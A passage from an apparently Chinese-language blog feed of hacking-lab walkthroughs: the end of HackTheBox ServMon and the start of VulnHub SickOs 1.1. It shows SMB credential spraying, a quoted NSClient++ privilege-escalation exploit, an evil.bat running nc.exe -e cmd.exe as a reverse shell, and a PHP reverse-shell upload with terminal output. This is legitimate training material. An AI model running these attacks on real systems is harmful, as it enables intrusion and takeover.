<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-type: text/plain</span><br><span class="line">Content-Length: 156</span><br><span class="line">Connection: close</span><br><span class="line">AuthInfo: </span><br><span class="line"></span><br><span class="line">1nsp3ctTh3Way2Mars!</span><br><span class="line">Th3r34r3To0M4nyTrait0r5!</span><br><span class="line">B3WithM30r4ga1n5tMe</span><br><span class="line">L1k3B1gBut7s@W0rk</span><br><span class="line">0nly7h3y0unGWi11F0l10w</span><br><span class="line">IfH3s4b0Utg0t0H1sH0me</span><br><span class="line">Gr4etN3w5w17hMySk1Pa5$</span><br></pre></td></tr></table></figure>

<p>在8443端口发现搭建了https服务，搭建了NSClient++的，参考下面的url</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm5zY2xpZW50Lm9yZy8=">About-NSClient++<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>有了密码，现在使用Marcello提供的CrackMapExec对其进行测试以识别帐户(Nadine或Nathan)以及关联的密码！</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2J5dDNibDMzZDNyL0NyYWNrTWFwRXhlYy8=">CrackMapExec<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/ServMon<span class="comment"># crackmapexec smb 10.10.10.184 -u Nadine -p pass.txt </span></span><br><span class="line">CME          10.10.10.184:445 SERVMON         [*] Windows 10.0 Build 18362 (name:SERVMON) (domain:SERVMON)</span><br><span class="line">CME          10.10.10.184:445 SERVMON         [-] SERVMON\Nadine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE </span><br><span class="line">CME          10.10.10.184:445 SERVMON         [-] SERVMON\Nadine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE </span><br><span class="line">CME          10.10.10.184:445 SERVMON         [-] SERVMON\Nadine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE </span><br><span class="line">CME          10.10.10.184:445 SERVMON         [+] SERVMON\Nadine:L1k3B1gBut7s@W0rk </span><br><span class="line">[*] KTHXBYE!</span><br><span class="line">root@kali:~/vulnhub/ServMon<span class="comment"># crackmapexec smb 10.10.10.184 -u Nathan -p pass.txt </span></span><br><span class="line">CME          10.10.10.184:445 SERVMON         [*] Windows 10.0 Build 18362 (name:SERVMON) (domain:SERVMON)</span><br><span class="line">CME          10.10.10.184:445 SERVMON         [-] SERVMON\Nathan:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE </span><br><span class="line">CME          10.10.10.184:445 SERVMON         [-] SERVMON\Nathan:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE </span><br><span class="line">CME          10.10.10.184:445 SERVMON         [-] SERVMON\Nathan:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE </span><br><span class="line">CME          10.10.10.184:445 SERVMON         [-] SERVMON\Nathan:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE </span><br><span class="line">CME          10.10.10.184:445 SERVMON         [-] SERVMON\Nathan:0nly7h3y0unGWi11F0l10w STATUS_LOGON_FAILURE </span><br><span class="line">CME          10.10.10.184:445 SERVMON         [-] SERVMON\Nathan:IfH3s4b0Utg0t0H1sH0me STATUS_LOGON_FAILURE </span><br><span class="line">CME          10.10.10.184:445 SERVMON         [-] SERVMON\Nathan:Gr4etN3w5w17hMySk1Pa5$ STATUS_LOGON_FAILURE </span><br><span class="line">[*] KTHXBYE!</span><br></pre></td></tr></table></figure>

<p>现在有了账号密码</p>
<p>Nadine/L1k3B1gBut7s@W0rk</p>
<p>然后使用密码访问其共享，发现并没有权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/ServMon<span class="comment"># crackmapexec smb 10.10.10.184 -u Nadine -p L1k3B1gBut7s@W0rk --shares</span></span><br><span class="line">CME          10.10.10.184:445 SERVMON         [*] Windows 10.0 Build 18362 (name:SERVMON) (domain:SERVMON)</span><br><span class="line">CME          10.10.10.184:445 SERVMON         [+] SERVMON\Nadine:L1k3B1gBut7s@W0rk </span><br><span class="line">CME          10.10.10.184:445 SERVMON         [+] Enumerating shares</span><br><span class="line">CME          10.10.10.184:445 SERVMON         SHARE           Permissions</span><br><span class="line">CME          10.10.10.184:445 SERVMON         -----           -----------</span><br><span class="line">CME          10.10.10.184:445 SERVMON         ADMIN$          NO ACCESS</span><br><span class="line">CME          10.10.10.184:445 SERVMON         IPC$            READ</span><br><span class="line">CME          10.10.10.184:445 SERVMON         C$              NO ACCESS</span><br><span class="line">[*] KTHXBYE!</span><br></pre></td></tr></table></figure>

<p>之后ssh连接，然后切换到目录下，得到user.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nadine@SERVMON C:\Users\Nadine\Desktop&gt;dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 728C-D22C</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Nadine\Desktop</span><br><span class="line"></span><br><span class="line">08/04/2020  22:28    &lt;DIR&gt;          .</span><br><span class="line">08/04/2020  22:28    &lt;DIR&gt;          ..</span><br><span class="line">23/04/2020  07:25                34 user.txt</span><br><span class="line">               1 File(s)             34 bytes</span><br><span class="line">               2 Dir(s)  27,427,053,568 bytes free</span><br><span class="line"></span><br><span class="line">nadine@SERVMON C:\Users\Nadine\Desktop&gt;<span class="built_in">type</span> user.txt</span><br><span class="line">daf5f2dab64783e2c42e4249e9821ab7</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb29.jpg"></li>
</ul>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>访问NSClient++的Web界面</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb30.jpg"></li>
</ul>
<p>执行命令查看密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nadine@SERVMON C:\Program Files\NSClient++&gt;nscp web -- password --display</span><br><span class="line">Current password: ew2x6SsGTxjRwXOT</span><br></pre></td></tr></table></figure>

<p>登录的时候却发现登陆失败，经过研究发现是因为nsclient.ini将指定的host对Web界面的访问。仅允许从本地服务器接口（127.0.0.1）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nadine@SERVMON C:\Program Files\NSClient++&gt;<span class="built_in">type</span> nsclient.ini</span><br><span class="line">´╗┐<span class="comment"># If you want to fill this file with all available options run the following command:</span></span><br><span class="line"><span class="comment">#   nscp settings --generate --add-defaults --load-all</span></span><br><span class="line"><span class="comment"># If you want to activate a module and bring in all its options use:</span></span><br><span class="line"><span class="comment">#   nscp settings --activate-module &lt;MODULE NAME&gt; --add-defaults</span></span><br><span class="line"><span class="comment"># For details run: nscp settings --help</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; <span class="keyword">in</span> flight - TODO</span><br><span class="line">[/settings/default]</span><br><span class="line"></span><br><span class="line">; Undocumented key</span><br><span class="line">password = ew2x6SsGTxjRwXOT</span><br><span class="line"></span><br><span class="line">; Undocumented key</span><br><span class="line">allowed hosts = 127.0.0.1</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>现在使用ssh转发8443tcp端口到本地127.0.0.1</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuc3NoLmNvbS9zc2gvdHVubmVsaW5nL2V4YW1wbGU=">SSH-Port-Forwarding-Example<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -L 8443:127.0.0.1:8443 Nadine@10.10.10.184</span><br></pre></td></tr></table></figure>

<p>运行上面的命令之后，成功的访问到了web界面</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb31.jpg"></li>
</ul>
<p>利用NSClient++ 0.5.2.35 提权漏洞进行提权</p>
<p>参考exploit</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDY4MDI=">NSClient++0.5.2.35-Privilege-Escalation<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>查看exploit</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Exploit Author: bzyo</span><br><span class="line">Twitter: @bzyo_</span><br><span class="line">Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation</span><br><span class="line">Date: 05-05-19</span><br><span class="line">Vulnerable Software: NSClient++ 0.5.2.35</span><br><span class="line">Vendor Homepage: http://nsclient.org/</span><br><span class="line">Version: 0.5.2.35</span><br><span class="line">Software Link: http://nsclient.org/download/</span><br><span class="line">Tested on: Windows 10 x64</span><br><span class="line"></span><br><span class="line">Details:</span><br><span class="line">When NSClient++ is installed with Web Server enabled, <span class="built_in">local</span> low privilege users have the ability to <span class="built_in">read</span> the web administator<span class="string">&#x27;s password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn&#x27;</span>t seem to be restrictions on <span class="built_in">where</span> the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and <span class="built_in">read</span> the changes to the web config.  </span><br><span class="line"></span><br><span class="line">Prerequisites:</span><br><span class="line">To successfully exploit this vulnerability, an attacker must already have <span class="built_in">local</span> access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.</span><br><span class="line"></span><br><span class="line">Exploit:</span><br><span class="line">1. Grab web administrator password</span><br><span class="line">- open c:\program files\nsclient++\nsclient.ini</span><br><span class="line">or</span><br><span class="line">- run the following that is instructed when you select forget password</span><br><span class="line">    C:\Program Files\NSClient++&gt;nscp web -- password --display</span><br><span class="line">    Current password: SoSecret</span><br><span class="line"></span><br><span class="line">2. Login and <span class="built_in">enable</span> following modules including <span class="built_in">enable</span> at startup and save configuration</span><br><span class="line">- CheckExternalScripts</span><br><span class="line">- Scheduler</span><br><span class="line"></span><br><span class="line">3. Download nc.exe and evil.bat to c:\temp from attacking machine</span><br><span class="line">    @<span class="built_in">echo</span> off</span><br><span class="line">    c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe</span><br><span class="line"></span><br><span class="line">4. Setup listener on attacking machine</span><br><span class="line">    nc -nlvvp 443</span><br><span class="line"></span><br><span class="line">5. Add script foobar to call evil.bat and save settings</span><br><span class="line">- Settings &gt; External Scripts &gt; Scripts</span><br><span class="line">- Add New</span><br><span class="line">    - foobar</span><br><span class="line">        <span class="built_in">command</span> = c:\temp\evil.bat</span><br><span class="line"></span><br><span class="line">6. Add schedulede to call script every 1 minute and save settings</span><br><span class="line">- Settings &gt; Scheduler &gt; Schedules</span><br><span class="line">- Add new</span><br><span class="line">    - foobar</span><br><span class="line">        interval = 1m</span><br><span class="line">        <span class="built_in">command</span> = foobar</span><br><span class="line"></span><br><span class="line">7. Restart the computer and <span class="built_in">wait</span> <span class="keyword">for</span> the reverse shell on attacking machine</span><br><span class="line">    nc -nlvvp 443</span><br><span class="line">    listening on [any] 443 ...</span><br><span class="line">    connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671</span><br><span class="line">    Microsoft Windows [Version 10.0.17134.753]</span><br><span class="line">    (c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">    C:\Program Files\NSClient++&gt;whoami</span><br><span class="line">    whoami</span><br><span class="line">    nt authority\system</span><br><span class="line">    </span><br><span class="line">Risk:</span><br><span class="line">The vulnerability allows <span class="built_in">local</span> attackers to escalate privileges and execute arbitrary code as Local System</span><br></pre></td></tr></table></figure>

<p>先查看自己的版本看看是否受影响</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nadine@SERVMON C:\Program Files\NSClient++&gt;nscp <span class="built_in">test</span></span><br><span class="line">D       core NSClient++ 0.5.2.35 2018-01-28 x64 Loading settings and logger...</span><br><span class="line">C:\Program Files\NSClient++\nsclient.log could not be opened, Discarding: debug: NSClient++ 0.5.2.35 2018-01-28 x64 Loading se</span><br><span class="line">ttings and logger...</span><br></pre></td></tr></table></figure>

<p>确实受到此漏洞的影响，下面先新建一个bat脚本，放到c:\Temp\目录下面</p>
<p>evil.bat</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">c:\temp\nc.exe 10.10.14.4 443 -e cmd.exe</span><br></pre></td></tr></table></figure>
<p>然后将nc.exe放入c:\temp\目录下</p>
<p>如下图配置一个脚本，以备之后点击之后运行bat文件弹回shell</p>
<ul>
<li><img src="https://miro.medium.com/max/1400/1*madTORF5bnMHwfdLdr4lfQ.png"></li>
</ul>
<p>从界面上的“control”按钮重新启动NSClient服务；</p>
<p>从Web界面的“queries”选项卡运行上一个脚本…</p>
<ul>
<li><img src="https://miro.medium.com/max/1400/1*pJZJgKjCFzBFe_ronrufbg.png"></li>
</ul>
<p>成功的返回了shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\hack the box靶机渗透\ServMon&gt;nc.exe -lvp 443</span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">10.10.10.184: inverse host lookup failed: h_errno 11004: NO_DATA (11004:11004)</span><br><span class="line">connect to [10.10.14.4] from (UNKNOWN) [10.10.10.184] 50272: NO_DATA (11004:11004)</span><br><span class="line">Microsoft Windows [Version 10.0.18363.752]</span><br><span class="line">(c) 2019 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Program Files\NSClient++&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://miro.medium.com/max/1400/1*1ZPMIoAtS_YRK4m_-z3z5Q.png"></li>
</ul>
<p>并且得到了最后的root.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 728C-D22C</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line">08/04/2020  23:12    &lt;DIR&gt;          .</span><br><span class="line">08/04/2020  23:12    &lt;DIR&gt;          ..</span><br><span class="line">23/04/2020  08:58                34 root.txt</span><br><span class="line">               1 File(s)             34 bytes</span><br><span class="line">               2 Dir(s)  27,433,795,584 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;<span class="built_in">type</span> root.txt</span><br><span class="line"><span class="built_in">type</span> root.txt</span><br><span class="line">887fe3797897795b474ceba6a399f7bd</span><br></pre></td></tr></table></figure>

<ul>
<li><p><img src="https://miro.medium.com/max/1132/1*5GY4yUDm4gXIJOqRAUhfAQ.png"></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb32.jpg"></p>
</li>
</ul>
<p><font color="red">知识点总结：</font></p>
<ul>
<li>Anonymous用户无需密码登录21 ftp</li>
<li>NVMS-1000目录遍历漏洞</li>
<li>CrackMapExec对smb进行测试账户及密码</li>
<li>ssh本地端口转发</li>
<li>NSClient++ 0.5.2.35 提权漏洞</li>
<li>使用nc.exe 10.10.14.4 443 -e cmd.exe命令反弹windows的cmd shell</li>
</ul>
<p><font color="red">Game over</font></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>HackTheBox walkthrough</category>
      </categories>
      <tags>
        <tag>HackTheBox靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[SickOs-1-1]</title>
    <url>/2020/03/27/SickOs-1-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：SickOs: 1.1<br>发布日期：2015年12月11日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9zaWNrb3Mvc2ljazBzMS4xLjd6">https://download.vulnhub.com/sickos/sick0s1.1.7z<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9zaWNrb3Mvc2ljazBzMS4xLjd6LnRvcnJlbnQ=">https://download.vulnhub.com/sickos/sick0s1.1.7z.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Name........: SickOs1.1</span><br><span class="line">Date Release: 11 Dec 2015</span><br><span class="line">Author......: D4rk</span><br><span class="line">Series......: SickOs</span><br><span class="line">Objective...: Get /root/a0216ea4d51874464078c618298b1367.txt</span><br><span class="line">Tester(s)...: h1tch1</span><br><span class="line">Twitter.....: https://twitter.com/D4rk36</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">该CTF明确地类比了如何在网络上执行黑客策略，以在安全的环境中危害网络。这个虚拟与在OSCP中遇到的实验室非常相似。目的是破坏网络/计算机并在其上获得管理root权限。</span><br></pre></td></tr></table></figure>

<p>文件信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FileName: sick0s1.1.7z</span><br><span class="line">File Size: 652.52 MB</span><br><span class="line">MD5: 396e46897c54da6ded6604b861c806b7</span><br><span class="line">SHA1: 3578a10ba92f860c2f0d8934ec5a9bbffc4c7859</span><br></pre></td></tr></table></figure>

<p>虚拟机：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Format: 7z</span><br><span class="line">Operating System: Ubuntu</span><br><span class="line">Tested: VMware Workstation 11.0.0 build-2305329</span><br></pre></td></tr></table></figure>

<p>联网：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">DHCP服务：已启用</span><br><span class="line">IP地址：自动分配</span><br></pre></td></tr></table></figure>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.66.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.66.13</span><br><span class="line">Host is up (0.00011s latency).</span><br><span class="line">MAC Address: 00:0C:29:A3:1D:35 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -sV -v 192.168.66.13</span></span><br><span class="line">PORT     STATE  SERVICE    VERSION</span><br><span class="line">22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">3128/tcp open   http-proxy Squid http proxy 3.1.19</span><br><span class="line">8080/tcp closed http-proxy</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p 22,3128,8080 -A -T4 -v 192.168.66.13 --script=vuln</span></span><br><span class="line">PORT     STATE  SERVICE    VERSION</span><br><span class="line">22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">3128/tcp open   http-proxy Squid http proxy 3.1.19</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-server-header: squid/3.1.19</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server<span class="string">&#x27;s resources causing Denial Of Service.</span></span><br><span class="line"><span class="string">|       </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-17</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       http://ha.ckers.org/slowloris/</span></span><br><span class="line"><span class="string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span></span><br><span class="line"><span class="string">| vulners: </span></span><br><span class="line"><span class="string">|   cpe:/a:squid-cache:squid:3.1.19: </span></span><br><span class="line"><span class="string">|       CVE-2016-4054   6.8     https://vulners.com/cve/CVE-2016-4054</span></span><br><span class="line"><span class="string">|       CVE-2016-4052   6.8     https://vulners.com/cve/CVE-2016-4052</span></span><br><span class="line"><span class="string">|       CVE-2016-4051   6.8     https://vulners.com/cve/CVE-2016-4051</span></span><br><span class="line"><span class="string">|       CVE-2014-7142   6.4     https://vulners.com/cve/CVE-2014-7142</span></span><br><span class="line"><span class="string">|       CVE-2014-7141   6.4     https://vulners.com/cve/CVE-2014-7141</span></span><br><span class="line"><span class="string">|       CVE-2016-4556   5.0     https://vulners.com/cve/CVE-2016-4556</span></span><br><span class="line"><span class="string">|       CVE-2016-4555   5.0     https://vulners.com/cve/CVE-2016-4555</span></span><br><span class="line"><span class="string">|       CVE-2016-10002  5.0     https://vulners.com/cve/CVE-2016-10002</span></span><br><span class="line"><span class="string">|       CVE-2012-5643   5.0     https://vulners.com/cve/CVE-2012-5643</span></span><br><span class="line"><span class="string">|_      CVE-2016-4053   4.3     https://vulners.com/cve/CVE-2016-4053</span></span><br><span class="line"><span class="string">8080/tcp closed http-proxy</span></span><br></pre></td></tr></table></figure>

<p>在nmap扫描期间观察到3128上存在有关代理的内容，那么尝试在firefox浏览器中手动建立代理。在HTTP代理和端口3128中提供VM的IP，如下图所示：</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub223.jpg"></li>
</ul>
<p>访问robotx.txt文件，查看里面的内容，然后进入wolfcms目录</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub224.jpg"></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub225.jpg"></p>
</li>
</ul>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>对Wolf CMS不太了解，所以搜索了Google以了解后台管理页面的位置。当通过Google找到登录页面时，将其打开。需要用户名和密码。默认情况下，用户名和密码分别为admin和admin，登录到管理控制台，然后选择文件选项卡，然后选择上传文件选项。</p>
<p>后台</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.66.13/wolfcms/?/admin/login</span><br></pre></td></tr></table></figure>

<p>账号密码：admin/admin</p>
<p>进入之后找到上传点上传php-reverse-shell</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub226.jpg"></li>
</ul>
<p>然后浏览器访问phpreverseshell,在kali端使用nc监听，反弹回了shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.66.13: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.66.6] from (UNKNOWN) [192.168.66.13] 44079</span><br><span class="line">Linux SickOs 3.11.0-15-generic <span class="comment">#25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux</span></span><br><span class="line"> 10:47:19 up  1:40,  0 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ pwd </span></span><br><span class="line"><span class="string">/</span></span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查看/etc/passwd文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">syslog:x:101:103::/home/syslog:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:102:105::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">whoopsie:x:103:106::/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">landscape:x:104:109::/var/lib/landscape:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash</span><br><span class="line">mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>在网站根目录下面找到配置文件中的数据库用户名和密码如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/var/www/wolfcms</span><br><span class="line">$ cat config.php</span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// Database information:</span><br><span class="line">// <span class="keyword">for</span> SQLite, use sqlite:/tmp/wolf.db (SQLite 3)</span><br><span class="line">// The path can only be absolute path or :memory:</span><br><span class="line">// For more info look at: www.php.net/pdo</span><br><span class="line"></span><br><span class="line">// Database settings:</span><br><span class="line">define(<span class="string">&#x27;DB_DSN&#x27;</span>, <span class="string">&#x27;mysql:dbname=wolf;host=localhost;port=3306&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_PASS&#x27;</span>, <span class="string">&#x27;john@123&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;TABLE_PREFIX&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>观察它提供的所有用户详细信息，会发现用户sickos的值为1000:1000，这意味着sickos是第一个用户。因此，在这里嗅到了root权限用户的气味，因为它是第一个用户。因此，使用发现的密码john@123将用户切换为sickos。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@SickOs:/var/www/wolfcms$ ls</span><br><span class="line">ls</span><br><span class="line">CONTRIBUTING.md  composer.json  docs         index.php  robots.txt</span><br><span class="line">README.md        config.php     favicon.ico  public     wolf</span><br><span class="line">www-data@SickOs:/var/www/wolfcms$ su sickos</span><br><span class="line">su sickos</span><br><span class="line">Password: john@123</span><br><span class="line"></span><br><span class="line">sickos@SickOs:/var/www/wolfcms$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(sickos) gid=1000(sickos) groups=1000(sickos),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)</span><br><span class="line">sickos@SickOs:/var/www/wolfcms$ whoami</span><br><span class="line">whoami</span><br><span class="line">sickos</span><br><span class="line">sickos@SickOs:/var/www/wolfcms$ <span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">bash: <span class="built_in">cd</span>: /root: Permission denied</span><br><span class="line">sickos@SickOs:/var/www/wolfcms$ sudo -s</span><br><span class="line">sudo -s</span><br><span class="line">[sudo] password <span class="keyword">for</span> sickos: 